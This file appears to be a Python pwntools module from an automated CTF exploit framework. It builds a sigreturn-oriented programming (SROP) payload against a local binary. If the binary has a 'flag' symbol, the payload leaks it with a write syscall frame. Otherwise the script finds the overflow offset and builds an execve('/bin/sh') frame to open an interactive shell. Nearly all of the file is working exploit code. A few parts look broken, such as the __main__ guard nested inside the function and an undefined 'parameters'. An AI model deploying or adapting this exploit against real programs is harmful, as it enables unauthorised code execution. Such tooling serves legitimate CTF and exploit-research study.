from pwn import *
import time
import subprocess
import sys
import re
from verify_exploit import *
from parser import *
from utils import *
from dynamic_analyser import *


libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6',checksec=True)


def find_win_funct(elf):
    WIN_FUNCTIONS=["flag", "key"]
    for func in WIN_FUNCTIONS:
        win_funct=get_symbol(elf, func)
        if win_funct == None:
            continue
        else:
            return win_funct
    return None

def get_sigreturn_payload(offset, sigreturn):
    junk = b"a" * offset 
    payload = junk
    payload += sigreturn 

    return payload

def get_sigreturn_frame(rop, bin):

    frame = SigreturnFrame()
    frame["rax"] = int(constants.SYS_execve)

    frame["rdi"] = bin
    #frame["rsi"] = 0
    #frame["rdx"] = 0
    frame["rip"] = u64(find_rop_gadget(rop,['syscall'])) 
    return frame


def get_win_funct_sigreturn_frame(binary, libc, win_funct):
    flag_size= 200
    frame = SigreturnFrame()
    frame.rip = get_symbol(binary, 'syscall') 
    frame.rax = int(constants.SYS_write)
    frame.rdi = int(constants.STDOUT_FILENO)
    frame.rsi = win_funct 
    frame.rdx = flag_size
    return frame

def sigrop_attack(parameters):
    binary_file = parameters[0]
        
    verbose = parameters[1]
    delimiter = parameters[2]    
    binary = ELF(f"{binary_file}")   
    vprint("\nFuzzing the program...", verbose)
    context.binary = binary = ELF(f"{binary_file}")
    rop=ROP(binary)
    p = process()
        
    sigreturn = getSigReturn(binary_file)
        
    
        



    s = process(f"{binary_file}")

        
    win_funct= find_win_funct(binary)
    if win_funct:
            
        frame = get_win_funct_sigreturn_frame(binary, libc, win_funct)
        payload = b""
        generate_sigrop_1(binary_file)
        
    else:
            
        vprint("\nFind the offset", verbose)    
        offset, _ = get_padding(p, delimiter)
        vprint(f"Rip offset: {offset}", verbose)
        bin = search_bin_sh(binary_file)
        frame = get_sigreturn_frame(rop, bin)
        payload = get_sigreturn_payload(offset, sigreturn)
        generate_sigrop_2(binary_file, offset)
        
    payload += bytes(frame)

    s.send(payload)
    vprint("\nHere is the shell:", verbose)
    s.interactive()

    if __name__ == "__main__":
        sigrop_attack(parameters)